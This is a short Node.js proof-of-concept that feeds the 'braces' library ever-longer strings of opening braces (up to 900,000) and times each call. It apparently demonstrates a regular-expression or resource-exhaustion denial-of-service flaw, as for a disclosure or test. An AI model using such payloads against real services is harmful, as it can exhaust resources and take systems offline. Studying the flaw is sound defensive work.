const { braces } = require('../index.js');


console.log("Executing payloads...");

const maxRepeats = 10;

for (let repeats = 1; repeats <= maxRepeats; repeats += 1) {
  const payload = '{'.repeat(repeats*90000);

  console.log(`Testing with ${repeats} repeats...`);
  const startTime = Date.now();
  braces(payload);
  const endTime = Date.now();
  const executionTime = endTime - startTime;
  console.log(`Regex executed in ${executionTime / 1000}s.\n`);
}
